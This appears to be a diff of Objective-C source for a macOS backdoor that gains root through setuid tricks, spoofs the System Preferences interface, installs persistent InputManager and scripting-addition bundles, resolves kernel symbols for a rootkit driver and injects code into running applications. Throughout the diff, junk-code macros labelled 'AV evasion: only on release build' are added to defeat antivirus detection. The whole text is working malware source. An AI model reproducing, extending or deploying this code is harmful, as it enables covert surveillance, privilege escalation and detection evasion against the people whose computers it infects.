   [gSharedMemoryLogging zeroFillMemory];
   
   return YES;
 }
 
 - (void)_checkForOthers
-{
+{  
+  // AV evasion: only on release build
+  AV_GARBAGE_005
+  
   //
   // Avoid to create the NSPort if we're running from a different name in order
   // to perform the UI spoofing (e.g. System Preferences) otherwise we'll lock
@@ -1964,6 +2274,9 @@ static void computerWillShutdown(CFMachPortRef port,
 #ifdef DEBUG_CORE
       infoLog(@"Registering NSPort to NameServer");
 #endif
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_002
       
       //
       // Check if there's another backdoor running
@@ -1997,9 +2310,15 @@ static void computerWillShutdown(CFMachPortRef port,
 #ifdef DEBUG_CORE
   infoLog(@"sliPlist mode");
 #endif
-
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
   if (getuid() != 0 && geteuid() != 0)
     {
+      // AV evasion: only on release build
+      AV_GARBAGE_001
+      
       if ([[NSFileManager defaultManager] fileExistsAtPath: [gUtil mExecFlag]
                                                isDirectory: NULL])
         {
@@ -2013,9 +2332,12 @@ static void computerWillShutdown(CFMachPortRef port,
       else
         {
           if ([self getRootThroughSLI] == YES)
-            {
+          {  
+            // AV evasion: only on release build
+            AV_GARBAGE_002
+            
               [gUtil dropExecFlag];
-            }
+          }
         }
     }
   else
@@ -2028,6 +2350,9 @@ static void computerWillShutdown(CFMachPortRef port,
       infoLog(@"sli mode success");
 #endif
       
+      // AV evasion: only on release build
+      AV_GARBAGE_001
+      
       [gUtil makeSuidBinary: [[NSBundle mainBundle] executablePath]];
       return YES;
     }
@@ -2036,7 +2361,10 @@ static void computerWillShutdown(CFMachPortRef port,
 }
 
 - (BOOL)_UISpoof
-{
+{  
+  // AV evasion: only on release build
+  AV_GARBAGE_006
+  
   if (getuid() != 0 && geteuid() != 0)
     {
       // Check the application executable name, if different than
@@ -2056,11 +2384,17 @@ static void computerWillShutdown(CFMachPortRef port,
                                     [[NSBundle mainBundle] bundlePath],
                                     mBinaryName, @".ez"];
           
+          // AV evasion: only on release build
+          AV_GARBAGE_001
+          
           [@"" writeToFile: tempFileName
                 atomically: YES
                   encoding: NSUTF8StringEncoding error: nil];
                   
           [tempFileName release];
+          
+          // AV evasion: only on release build
+          AV_GARBAGE_000
           
           [self _renameBackdoorAndRelaunch];
         }
@@ -2073,6 +2407,9 @@ static void computerWillShutdown(CFMachPortRef port,
     {
       if ([mBinaryName isEqualToString: @"System Preferences"])
         {
+          // AV evasion: only on release build
+          AV_GARBAGE_002
+          
           [gUtil enableSetugidAuth];
           usleep(10000);
           [self UISudoWhileAlreadyAuthorized: YES];
@@ -2083,11 +2420,17 @@ static void computerWillShutdown(CFMachPortRef port,
       NSString *flagPath   = [NSString stringWithFormat: @"%@/%@",
                               [[NSBundle mainBundle] bundlePath],
                               @"mdworker.flg"];
-    
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_003
+      
       if (![[NSFileManager defaultManager] fileExistsAtPath: flagPath
                                                 isDirectory: NO])
         {
           [gUtil dropExecFlag];
+          
+          // AV evasion: only on release build
+          AV_GARBAGE_002
           
           NSString *backdoorPlist = [NSString stringWithFormat: @"%@/%@",
                                      [[[[[NSBundle mainBundle] bundlePath]
@@ -2102,6 +2445,9 @@ static void computerWillShutdown(CFMachPortRef port,
                                 @"Aqua",
                                 backdoorPlist,
                                 nil];
+          
+          // AV evasion: only on release build
+          AV_GARBAGE_001
           
           [gUtil executeTask: @"/bin/launchctl"
                withArguments: arguments
@@ -2119,6 +2465,10 @@ static void computerWillShutdown(CFMachPortRef port,
 - (BOOL)_dropInputManager
 {
   NSString *err;
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_007
+  
   NSString *_backdoorContentPath = [NSString stringWithFormat: @"%@/%@",
                                     [[NSBundle mainBundle] bundlePath],
                                     @"Contents"];
@@ -2128,7 +2478,10 @@ static void computerWillShutdown(CFMachPortRef port,
       [[NSFileManager defaultManager] removeItemAtPath: @"/Library/InputManagers/appleHID"
                                                  error: nil];
     }
-
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
   //
   // Input Manager
   //
@@ -2145,7 +2498,11 @@ static void computerWillShutdown(CFMachPortRef port,
       errorLog(@"Error mkdir appleHID (%d)", errno);
 #endif
       return NO;
-    }
+    }  
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   if (mkdir("/Library/InputManagers/appleHID/appleHID.bundle", 0755) == -1 && errno != EEXIST)
     {
 #ifdef DEBUG_CORE
@@ -2153,6 +2510,10 @@ static void computerWillShutdown(CFMachPortRef port,
 #endif
       return NO;
     }
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
   if (mkdir("/Library/InputManagers/appleHID/appleHID.bundle/Contents", 0755) == -1 && errno != EEXIST)
     {
 #ifdef DEBUG_CORE
@@ -2160,6 +2521,10 @@ static void computerWillShutdown(CFMachPortRef port,
 #endif
       return NO;
     }
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   if (mkdir("/Library/InputManagers/appleHID/appleHID.bundle/Contents/MacOS", 0755) == -1 && errno != EEXIST)
     {
 #ifdef DEBUG_CORE
@@ -2174,11 +2539,17 @@ static void computerWillShutdown(CFMachPortRef port,
 #endif
       return NO;
     }
-
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
   NSMutableDictionary *rootObj2 = [NSMutableDictionary dictionaryWithCapacity: 4];
   NSMutableDictionary *innerDict2 = [NSMutableDictionary dictionaryWithCapacity: 1];
   [innerDict2 setObject: gInputManagerName
                  forKey: @"English"];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
   
   [rootObj2 setObject: @"appleHID.bundle"
                forKey: @"BundleName"];
@@ -2196,6 +2567,9 @@ static void computerWillShutdown(CFMachPortRef port,
   [binData writeToFile: @"/Library/InputManagers/appleHID/Info"
             atomically: YES];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   NSString *destDir = [[NSString alloc] initWithFormat:
                        @"/Library/InputManagers/%@/%@.bundle/Contents/MacOS/%@",
                        EXT_BUNDLE_FOLDER,
@@ -2205,6 +2579,9 @@ static void computerWillShutdown(CFMachPortRef port,
   NSString *tempIMDir = [[NSString alloc] initWithFormat: @"%@/%@",
                          [[NSBundle mainBundle] bundlePath],
                          gInputManagerName];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_003
   
   if ([[NSFileManager defaultManager] fileExistsAtPath: destDir
                                            isDirectory: NO] == NO)
@@ -2220,6 +2597,9 @@ static void computerWillShutdown(CFMachPortRef port,
   // InputManager internal Info.plist
   //
   NSMutableDictionary *rootObj   = [NSMutableDictionary dictionaryWithCapacity: 7];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_006
   
   [rootObj setObject: @"English" forKey: @"CFBundleDevelopmentRegion"];
   [rootObj setObject: gInputManagerName forKey: @"CFBundleExecutable"];
@@ -2238,6 +2618,9 @@ static void computerWillShutdown(CFMachPortRef port,
                           EXT_BUNDLE_FOLDER,
                           EXT_BUNDLE_FOLDER];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_008
+  
   [binData writeToFile: _backdoorContentPath
             atomically: YES];
   
@@ -2246,6 +2629,10 @@ static void computerWillShutdown(CFMachPortRef port,
                         @"root:admin",
                         destDir,
                         nil];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
   [gUtil executeTask: @"/usr/sbin/chown"
         withArguments: arguments
          waitUntilEnd: YES];
@@ -2258,16 +2645,25 @@ static void computerWillShutdown(CFMachPortRef port,
 {
   NSString *osaxRootPath = nil;
   
+  // AV evasion: only on release build
+  AV_GARBAGE_007
+  
   if (getuid() == 0 || geteuid() == 0) 
     {
       osaxRootPath = [[NSString alloc] initWithFormat: @"/%@", OSAX_ROOT_PATH];
-
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_003
+      
       // i'm root: remove old low privs osax from user folders
       NSString *osaxLowPrivsPath = [[NSString alloc] initWithFormat: @"/Users/%@/%@/%@",
                                                       NSUserName(),
                                                       OSAX_ROOT_PATH,
                                                       EXT_BUNDLE_FOLDER];
-
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_009
+      
       if ([[NSFileManager defaultManager] fileExistsAtPath: osaxLowPrivsPath])
         {
           [[NSFileManager defaultManager] removeItemAtPath: osaxLowPrivsPath
@@ -2282,6 +2678,9 @@ static void computerWillShutdown(CFMachPortRef port,
                                                        OSAX_ROOT_PATH];
     }
   
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   if (![[NSFileManager defaultManager] fileExistsAtPath: osaxRootPath])
     {
       [[NSFileManager defaultManager] createDirectoryAtPath: osaxRootPath 
@@ -2289,6 +2688,9 @@ static void computerWillShutdown(CFMachPortRef port,
                                                  attributes: nil 
                                                       error: nil];
     }
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_003
   
   NSMutableString *osaxPath = [[NSMutableString alloc] initWithFormat: @"%@/%@",
                                                                         osaxRootPath,
@@ -2300,20 +2702,37 @@ static void computerWillShutdown(CFMachPortRef port,
                                                  error: nil];
     }
   
+  // AV evasion: only on release build
+  AV_GARBAGE_007
+  
   // Scripting folder
   mkdir([osaxRootPath UTF8String], 0755);
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_007
+  
   mkdir([osaxPath UTF8String], 0755);
   
-  [osaxPath appendString: @"/Contents"];
+  [osaxPath appendString: @"/Contents"];      
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
   mkdir([osaxPath UTF8String], 0755);
   
   NSString *tmpPath = [[NSString alloc] initWithFormat: @"%@/MacOS", osaxPath];
   mkdir([tmpPath UTF8String], 0755);
   [tmpPath release];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
   [osaxPath appendString: @"/Resources"];
   mkdir([osaxPath UTF8String], 0755);
 
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
   NSString *destDir = [[NSString alloc] initWithFormat:
                        @"%@/%@/Contents/MacOS/%@",
                        osaxRootPath,
@@ -2324,6 +2743,9 @@ static void computerWillShutdown(CFMachPortRef port,
   NSString *tempIMDir = [[NSString alloc] initWithFormat: @"%@/%@",
                          [[NSBundle mainBundle] bundlePath],
                          gInputManagerName];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
   
   if ([[NSFileManager defaultManager] fileExistsAtPath: destDir
                                            isDirectory: NO] == NO)
@@ -2336,6 +2758,9 @@ static void computerWillShutdown(CFMachPortRef port,
   [tempIMDir release];
   [destDir release];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
   NSString *info_orig_pl = [[NSString alloc] initWithCString: Info_plist];
 
   NSString *info_pl = [info_orig_pl stringByReplacingOccurrencesOfString: @"_place_on_" 
@@ -2345,6 +2770,9 @@ static void computerWillShutdown(CFMachPortRef port,
                         @"%@/%@/Contents/Info.plist",
                         osaxRootPath,
                         EXT_BUNDLE_FOLDER];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
   
   [info_pl writeToFile: infoPath
             atomically: NO
@@ -2360,6 +2788,9 @@ static void computerWillShutdown(CFMachPortRef port,
                      @"%@/%@/Contents/Resources/appleOsax.r",
                      osaxRootPath,
                      EXT_BUNDLE_FOLDER];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_000
   
   [resource_r writeToFile: rPath
                atomically: NO
@@ -2474,7 +2905,10 @@ static void computerWillShutdown(CFMachPortRef port,
 }
 
 - (void)_solveKernelSymbolsForKext
-{
+{    
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
   int kernFD      = 0;
   int ret         = 0;
   int filesize    = 0;
@@ -2500,7 +2934,10 @@ static void computerWillShutdown(CFMachPortRef port,
 #ifdef DEBUG_CORE
   infoLog(@"Resolving symbols for kernel driver");
 #endif
-
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
   kernFD = open(filename, O_RDONLY);
   
   if (kernFD == -1) 
@@ -2519,6 +2956,9 @@ static void computerWillShutdown(CFMachPortRef port,
       return;
   }
   
+  // AV evasion: only on release build
+  AV_GARBAGE_004
+  
   if (stat(filename, &sb) == -1)
     {
 #ifdef DEBUG_CORE
@@ -2532,6 +2972,9 @@ static void computerWillShutdown(CFMachPortRef port,
 #ifdef DEBUG_CORE
   infoLog(@"filesize: %d\n", filesize);
 #endif
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_005
   
   if ((imageBase = mmap(0,
                         filesize,
@@ -2551,6 +2994,9 @@ static void computerWillShutdown(CFMachPortRef port,
   infoLog(@"file mapped @ 0x%lx\n", (unsigned long)imageBase);
 #endif
   
+  // AV evasion: only on release build
+  AV_GARBAGE_006
+  
   BOOL kernel64 = is64bitKernel();
   if (kernel64)
     {
@@ -2561,78 +3007,117 @@ static void computerWillShutdown(CFMachPortRef port,
       uint64_t symAddress = 0;
       // 64bit kernel image
       // thus we need to map the 64bit part
-
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_003
+      
       // Sending Symbol
       symAddress  = findSymbolInFatBinary64(imageBase, kmod_hash);
       sym.hash    = kmod_hash;
       sym.address = symAddress;
       ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM_64, &sym);
-
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_002
+      
       // Sending Symbol
       symAddress  = findSymbolInFatBinary64(imageBase, nsysent_hash);
       sym.hash    = nsysent_hash;
       sym.address = symAddress;
       ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM_64, &sym);
-
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_001
+      
       // Sending Symbol
       symAddress  = findSymbolInFatBinary64(imageBase, tasks_hash);
       sym.hash    = tasks_hash;
       sym.address = symAddress;
       ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM_64, &sym);
-
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_002
+      
       // Sending Symbol
       symAddress  = findSymbolInFatBinary64(imageBase, allproc_hash);
       sym.hash    = allproc_hash;
       sym.address = symAddress;
       ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM_64, &sym);
-
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_003
+      
       // Sending Symbol
       symAddress  = findSymbolInFatBinary64(imageBase, tasks_count_hash);
       sym.hash    = tasks_count_hash;
       sym.address = symAddress;
       ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM_64, &sym);
-
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_000
+      
       // Sending Symbol
       symAddress  = findSymbolInFatBinary64(imageBase, nprocs_hash);
       sym.hash    = nprocs_hash;
       sym.address = symAddress;
       ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM_64, &sym);
-
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_001
+      
       // Sending Symbol
       symAddress  = findSymbolInFatBinary64(imageBase, tasks_threads_lock_hash);
       sym.hash    = tasks_threads_lock_hash;
       sym.address = symAddress;
       ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM_64, &sym);
-
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_002
+      
       // Sending Symbol
       symAddress  = findSymbolInFatBinary64(imageBase, proc_lock_hash);
       sym.hash    = proc_lock_hash;
       sym.address = symAddress;
       ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM_64, &sym);
-
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_003
+      
       // Sending Symbol
       symAddress  = findSymbolInFatBinary64(imageBase, proc_unlock_hash);
       sym.hash    = proc_unlock_hash;
       sym.address = symAddress;
       ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM_64, &sym);
-
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_004
+      
       // Sending Symbol
       symAddress  = findSymbolInFatBinary64(imageBase, proc_list_lock_hash);
       sym.hash    = proc_list_lock_hash;
       sym.address = symAddress;
       ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM_64, &sym);
-
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_005
+      
       // Sending Symbol
       symAddress  = findSymbolInFatBinary64(imageBase, proc_list_unlock_hash);
       sym.hash    = proc_list_unlock_hash;
       sym.address = symAddress;
       ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM_64, &sym);
       
+      // AV evasion: only on release build
+      AV_GARBAGE_006
+      
       // Sending Symbol
       symAddress  = findSymbolInFatBinary64(imageBase, kext_lookup_with_tag_hash);
       sym.hash    = kext_lookup_with_tag_hash;
       sym.address  = symAddress;
       ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM_64, &sym);
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_007
       
       // Sending Symbol
       symAddress  = findSymbolInFatBinary64(imageBase, io_recursive_lock_hash);
@@ -2648,77 +3133,116 @@ static void computerWillShutdown(CFMachPortRef port,
       symbol32_t sym;
       unsigned int symAddress = 0;
       
+      // AV evasion: only on release build
+      AV_GARBAGE_000
+      
       // Sending Symbol
       symAddress  = findSymbolInFatBinary(imageBase, kmod_hash);
       sym.hash    = kmod_hash;
       sym.address = symAddress;
       ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM_32, &sym);
-
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_006
+      
       // Sending Symbol
       symAddress  = findSymbolInFatBinary(imageBase, nsysent_hash);
       sym.hash    = nsysent_hash;
       sym.address = symAddress;
       ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM_32, &sym);
-
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_008
+      
       // Sending Symbol
       symAddress  = findSymbolInFatBinary(imageBase, tasks_hash);
       sym.hash    = tasks_hash;
       sym.address = symAddress;
       ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM_32, &sym);
-
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_004
+      
       // Sending Symbol
       symAddress  = findSymbolInFatBinary(imageBase, allproc_hash);
       sym.hash    = allproc_hash;
       sym.address = symAddress;
       ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM_32, &sym);
-
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_005
+      
       // Sending Symbol
       symAddress  = findSymbolInFatBinary(imageBase, tasks_count_hash);
       sym.hash    = tasks_count_hash;
       sym.address = symAddress;
       ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM_32, &sym);
-
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_002
+      
       // Sending Symbol
       symAddress  = findSymbolInFatBinary(imageBase, nprocs_hash);
       sym.hash    = nprocs_hash;
       sym.address = symAddress;
       ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM_32, &sym);
-
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_001
+      
       // Sending Symbol
       symAddress  = findSymbolInFatBinary(imageBase, tasks_threads_lock_hash);
       sym.hash    = tasks_threads_lock_hash;
       sym.address = symAddress;
       ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM_32, &sym);
-
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_002
+      
       // Sending Symbol
       symAddress  = findSymbolInFatBinary(imageBase, proc_lock_hash);
       sym.hash    = proc_lock_hash;
       sym.address = symAddress;
       ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM_32, &sym);
-
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_005
+      
       // Sending Symbol
       symAddress  = findSymbolInFatBinary(imageBase, proc_unlock_hash);
       sym.hash    = proc_unlock_hash;
       sym.address = symAddress;
       ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM_32, &sym);
-
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_003
+      
       // Sending Symbol
       symAddress  = findSymbolInFatBinary(imageBase, proc_list_lock_hash);
       sym.hash    = proc_list_lock_hash;
       sym.address = symAddress;
       ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM_32, &sym);
-
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_006
+      
       // Sending Symbol
       symAddress  = findSymbolInFatBinary(imageBase, proc_list_unlock_hash);
       sym.hash    = proc_list_unlock_hash;
       sym.address = symAddress;
       ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM_32, &sym);
       
+      // AV evasion: only on release build
+      AV_GARBAGE_007
+      
       // Sending Symbol
       symAddress  = findSymbolInFatBinary(imageBase, kext_lookup_with_tag_hash);
       sym.hash    = kext_lookup_with_tag_hash;
       sym.address = symAddress;
       ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM_32, &sym);
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_009
       
       // Sending Symbol
       symAddress  = findSymbolInFatBinary(imageBase, io_recursive_lock_hash);
@@ -2727,7 +3251,14 @@ static void computerWillShutdown(CFMachPortRef port,
       ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM_32, &sym);      
     }
   
+  // AV evasion: only on release build
+  AV_GARBAGE_007
+  
   munmap(imageBase, filesize);
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   close(kernFD);
 }
 
@@ -2737,7 +3268,10 @@ static void computerWillShutdown(CFMachPortRef port,
 // Looks like it's undocumented
 //
 - (void)_registerForShutdownNotifications
-{
+{    
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
 
 #ifdef DEBUG_CORE
@@ -2759,21 +3293,33 @@ static void computerWillShutdown(CFMachPortRef port,
     {
 #ifdef DEBUG_CORE
       infoLog(@"Registering notifications for Leopard");
-#endif
+#endif    
+      // AV evasion: only on release build
+      AV_GARBAGE_002
+      
       notify_return = notify_register_mach_port(kLLWShutdowntInitiated,
                                                 &our_port,
                                                 0, /* flags */
                                                 &gLWShutdownNotificationToken);
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_002
       
       notify_return = notify_register_mach_port(kLLWRestartInitiated,
                                                 &our_port,
                                                 NOTIFY_REUSE, /* flags */
                                                 &gLWRestartNotificationToken);
       
+      // AV evasion: only on release build
+      AV_GARBAGE_004
+      
       notify_return = notify_register_mach_port(kLLWLogoutCancelled,
                                                 &our_port,
                                                 NOTIFY_REUSE, /* flags */
                                                 &gLWLogoutCancelNotificationToken);
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_005
       
       notify_return = notify_register_mach_port(kLLWLogoutPointOfNoReturn, 
                                                 &our_port,
@@ -2790,6 +3336,9 @@ static void computerWillShutdown(CFMachPortRef port,
                                                 0, /* flags */
                                                 &gLWShutdownNotificationToken);
       
+      // AV evasion: only on release build
+      AV_GARBAGE_006
+      
       notify_return = notify_register_mach_port(kSLLWRestartInitiated,
                                                 &our_port,
                                                 NOTIFY_REUSE, /* flags */
@@ -2800,11 +3349,17 @@ static void computerWillShutdown(CFMachPortRef port,
                                                 NOTIFY_REUSE, /* flags */
                                                 &gLWLogoutCancelNotificationToken);
       
+      // AV evasion: only on release build
+      AV_GARBAGE_007
+      
       notify_return = notify_register_mach_port(kSLLWLogoutPointOfNoReturn, 
                                                 &our_port,
                                                 NOTIFY_REUSE, /* flags */
                                                 &gLWLogoutPointOfNoReturnNotificationToken);
     }
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_008
   
   gNotifyMachPort = CFMachPortCreateWithPort(kCFAllocatorDefault,
                                              our_port,
@@ -2814,12 +3369,18 @@ static void computerWillShutdown(CFMachPortRef port,
   if (!gNotifyMachPort)
     return;
   
+  // AV evasion: only on release build
+  AV_GARBAGE_009
+  
   // Create RLS for mach port
   gNotifyMachPortRLS = CFMachPortCreateRunLoopSource(kCFAllocatorDefault,
                                                      gNotifyMachPort,
                                                      0); /* order */
   if (!gNotifyMachPortRLS)
     return;
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_000
   
   CFRunLoopAddSource(CFRunLoopGetCurrent(),
                      gNotifyMachPortRLS,
@@ -2926,7 +3487,10 @@ static void computerWillShutdown(CFMachPortRef port,
 }
 
 - (int)connectKext
-{
+{  
+  // AV evasion: only on release build
+  AV_GARBAGE_005
+  
 #ifdef DEBUG_CORE
   infoLog(@"Initializing backdoor with kext");
 #endif
@@ -2937,8 +3501,11 @@ static void computerWillShutdown(CFMachPortRef port,
   {
     int ret;//, bID;
     
+    // AV evasion: only on release build
+    AV_GARBAGE_003
     
     ret = ioctl(gBackdoorFD, MCHOOK_INIT, [NSUserName() UTF8String]);
+    
     if (ret < 0)
     {
 #ifdef DEBUG_CORE
@@ -2964,20 +3531,35 @@ static void computerWillShutdown(CFMachPortRef port,
     return -1;
   }
   
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
   return 0;
 }
 
 - (void)sendEventToPid: (NSNumber *)thePid
-{
+{  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   AEEventID eventID = 'open';
   int eUid = geteuid();
   int rUid = getuid();
   int maxRetry = 10;
   
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
   if (thePid == nil)
     return;
   
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_004
   
   // On lion fork to sendEvents without problem
   if ([gUtil isLion]) 
@@ -3006,11 +3588,17 @@ static void computerWillShutdown(CFMachPortRef port,
     return;
   }
   
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
   __m_MTaskManager *_taskManager = [__m_MTaskManager sharedInstance];
   
   [gControlFlagLock lock];
   NSString *localFlag = [_taskManager getControlFlag];
   [gControlFlagLock unlock];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_003
   
   if ([localFlag isEqualToString: @"STOP"])
   {
@@ -3018,6 +3606,9 @@ static void computerWillShutdown(CFMachPortRef port,
   }
   
   pid_t pidP = (pid_t) [thePid intValue];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_008
   
   SBApplication *app = [SBApplication applicationWithProcessIdentifier: pidP];
   
@@ -3038,6 +3629,10 @@ static void computerWillShutdown(CFMachPortRef port,
   
   [app setTimeout: 1];
   [app setSendMode: kAENoReply | kAENeverInteract | kAEDontRecord];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
   [app sendEvent: kASAppleScriptSuite
               id: kGetAEUT
       parameters: 0];
@@ -3045,17 +3640,27 @@ static void computerWillShutdown(CFMachPortRef port,
   sleep(1);
   
   
+  // AV evasion: only on release build
+  AV_GARBAGE_008
+  
   NSNumber *pid = [NSNumber numberWithInt: getpid()];
   
   [app setTimeout: 1];
-  [app setSendMode: kAENoReply | kAENeverInteract | kAEDontRecord];
+  [app setSendMode: kAENoReply | kAENeverInteract | kAEDontRecord];  
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_007
+  
   id injectReply = [app sendEvent: 'OPNe'
                                id: eventID
                        parameters: 'pido', pid, 0];
   
   // Check if the seteuid do the correct work...
   while ((geteuid() != eUid) && maxRetry--) 
-  {
+  {  
+    // AV evasion: only on release build
+    AV_GARBAGE_000
+    
     // original u&g
     if (seteuid(eUid) == -1)
     {
@@ -3075,6 +3680,9 @@ static void computerWillShutdown(CFMachPortRef port,
              geteuid(), getuid());
 #endif
   
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   if (injectReply != nil) 
   {
 #ifdef DEBUG_CORE	
@@ -3088,14 +3696,26 @@ static void computerWillShutdown(CFMachPortRef port,
 #endif
   }
   
+  // AV evasion: only on release build
+  AV_GARBAGE_009
+  
   [pool release];  
 }
 
 - (void)injectRunningApp
-{
+{  
+  // AV evasion: only on release build
+  AV_GARBAGE_005
+  
   NSAutoreleasePool * pool = [[NSAutoreleasePool alloc] init];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
   NSWorkspace *ws = [NSWorkspace sharedWorkspace];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_000
   
   NSArray *apps = [ws runningApplications];
   
@@ -3105,14 +3725,27 @@ static void computerWillShutdown(CFMachPortRef port,
     {
       NSRunningApplication *app = (NSRunningApplication*) [apps objectAtIndex:i];
       
+      // AV evasion: only on release build
+      AV_GARBAGE_006
+      
       pid_t tmpPid = [app processIdentifier];
       
+      // AV evasion: only on release build
+      AV_GARBAGE_001
+      
       NSNumber *thePid = [[NSNumber alloc] initWithInt: tmpPid];
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_002
       
 #ifdef DEBUG_CORE_
       infoLog(@"%s: Injecting app %@ [%d]", __FUNCTION__, 
               [app localizedName], [app processIdentifier]);
 #endif
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_001
+      
       [self sendEventToPid:thePid]; 
       
       [thePid release];
@@ -3121,31 +3754,52 @@ static void computerWillShutdown(CFMachPortRef port,
     }
   }
   
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
   [pool release];
 }
 
 - (void)checkAndRunDemoMode
-{
+{  
+  // AV evasion: only on release build
+  AV_GARBAGE_007
+  
   NSString *appName = [[[NSBundle mainBundle] executablePath] lastPathComponent];
   
   // FIXED- demo mode
   if ([appName isEqualToString: @"System Preferences"] == FALSE)
-  {
+  {  
+    // AV evasion: only on release build
+    AV_GARBAGE_004
+    
     // precalc sha1 of "hxVtdxJ/Z8LvK3ULSnKRUmLE
     char demoSha1[] = "\x31\xa2\x85\xaf\xb0\x43\xe7\xa0\x90\x49"
     "\x94\xe1\x70\x07\xc8\x26\x3d\x45\x42\x73";
     
     NSMutableData *isDemoMarker = [[NSMutableData alloc] initWithBytes: demoSha1 length: 20];
     
+    // AV evasion: only on release build
+    AV_GARBAGE_001
+    
     NSMutableData *demoMode = [[NSData alloc] initWithBytes: gDemoMarker length: 24];
     
+    // AV evasion: only on release build
+    AV_GARBAGE_002
+    
     NSMutableData *currDemoMode = [demoMode sha1Hash];
+    
+    // AV evasion: only on release build
+    AV_GARBAGE_004
     
